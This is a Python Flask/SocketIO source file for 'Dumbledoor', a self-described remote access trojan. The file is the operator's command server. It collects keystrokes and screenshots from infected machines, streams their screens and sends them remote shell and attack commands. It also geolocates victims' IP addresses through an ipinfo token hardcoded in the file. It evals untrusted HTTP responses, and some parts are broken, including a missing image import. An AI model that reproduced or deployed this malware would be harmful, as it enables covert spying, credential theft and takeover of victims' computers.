from flask import Flask, render_template, request, Response
from flask_socketio import SocketIO, emit
import logging
import threading
from io import *
from time import sleep
import os
import random
import socketio
import json
import requests
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

TOKEN = 'f056c72b2110f7'
app = Flask('app')
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)
about = '''
Dumbledoor by posydon
Created using socketio and Flask, as a replacement for Dobby, the best RAT of all time
Use with caution!
“Happiness can be found in the darkest of times, if one only remembers to turn on the light.”(Dumbledoor)
'''
limiter = Limiter(
    app,
    default_limits=["100000 per day", "150000 per hour", "250 per second"]
)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
connected = {}

def ip_lookup(ip):
  url = f'http://ipinfo.io/{ip}?token={TOKEN}'
  response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{id}'}).text)
  response_ipinfo['google-maps-link'] = f"https://www.google.com/maps/search/{response_ipinfo['loc']}"
  for key in response_ipinfo:
    print(f"{key}: {response_ipinfo[key]}")
  
def generate_screen_feed(image_bytes):
    while True:
        buffer = BytesIO(image_bytes)
        screenshot = Image.open(buffer)
        buffer = BytesIO()
        screenshot.save(buffer, 'JPEG', quality=80)
        buffer.seek(0)
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + buffer.read() + b'\r\n')
      
@app.route('/screen-feed', methods=['POST', 'GET'])
def screen_feed():
    return Response(generate_screen_feed(request.data),
                    mimetype='multipart/x-mixed-replace; boundary=frame')
  
@app.route('/')
def hello_world():
  return 'success'
  
@app.route('/keys', methods=['POST'])
def keys():
  data = request.data
  key = data['keys']
  with open('endpoint/keys/keys.txt','a') as file:
    file.write(key)

@app.route('/upload', methods=['POST'])
def upload():
  image_file = request.files['image']
  # Save the file to disk
  path = random.randint(0,100)
  save_path = os.path.join('endpoint', "image|" + str(path) + ".png")
  image_file.save(save_path)
  print(f'saved as {path}')
  return "200"
  
def monitor_mode():
  global connected
  os.system('clear')
  while True:
    os.system('clear')
    table = '''|-------------------|-------------|'''
    for id in connected:
      table += f"\n|{id}|{connected[id]['ip']}|"
    print(table)
    sleep(1)
      
def shell():
  global connected
  sleep(2)
  menu()
  while True:
    elder_wand = get()
    for key in connected:
      if key == elder_wand:
        while True:
          spell = get_spec(elder_wand)
          if spell == 'info':
            print(f'\nInfo on {elder_wand}')
            for key2 in connected[key]:
              print(connected[key][key2])
            else:
              continue
          elif spell == 'shell':
            while True:
              command = get_spec(f"{elder_wand}/shell")
              if command == 'END':
                break
              else:
                command_data = {'command': command, 'id': elder_wand}
                socketio.emit('shell', command_data)
                sleep(3)
          elif spell == 'avada':
            specs = get_spec(f'{elder_wand}/avada')
            if specs == 'END':
              break
            else:
                
              split_specs = specs.split()
              try:
                param1 = split_specs[2]
              except:
                param1 = None
              try:
                param2 = split_specs[3]
              except:
                param2 = None
              try:
                param3 = split_specs[4]
              except:
                param3 = None
              command_data = {'repeat': split_specs[0], 'command': split_specs[1], 'param1': param1, 'param2': param2, 'param3': param3, 'id': elder_wand}
              
              socketio.emit('command', data=command_data, room=connected[key]['sid'])
              sleep(3)
          elif spell == 'END':
            break
            
    if elder_wand == 'list':
      for key in connected:
        print(key)
        print(f'total: {len(connected)}')
    elif elder_wand == 'about':
      print(about)
      
    elif elder_wand == 'menu':
      menu()

    elif elder_wand == 'ip-lookup':
      ip_lookup(get_spec('ip-lookup/ip'))

    elif elder_wand == 'clear_cache':
      connected = {}
      os.system('clear')
      print('Cache has been cleared. Please allow up to 10 seconds for clients to reconnect to the server')

    elif elder_wand == 'monitor':
      monitor_mode()
      
def menu():
  os.system('clear')
  print('DUMBLEDOOR by posydon')
  print('"Curiosity is not a sin.... But we should exercise caution with our curiosity... yes, indeed."')
  print(f'connected: {len(connected)}')
  
def get():
  return input("dumbledoor$ ")

def get_spec(spec):
  return input(f"dumbledoor/{spec}$ ")
  
@socketio.on('message')
def message(json):
  pass

@socketio.on('response')
def response(data):
  print(data['output'])

@socketio.on('log')
def log(data):
  with open('log.txt', 'a') as log:
    log.write('\n'+data['content'])
    log.close()
    
@socketio.on('check_in')
def check_in(json):
  if json['id'] in connected:
    pass
  else:
    connected[json['id']] = json
    connected[json['id']]['sid'] = str(request.sid)
    
@app.route('/clients')
def get_clients():
    # get the dictionary of connected clients
    clients = socketio.server.manager.rooms['/'].keys()
    # convert the dictionary keys to a list and return it
    return {'clients': list(clients)}
  
@app.route('/api')
def api():
  return 200
  
shell_thread = threading.Thread(target=shell)
shell_thread.start()

socketio.run(app, host='0.0.0.0', port=8080)
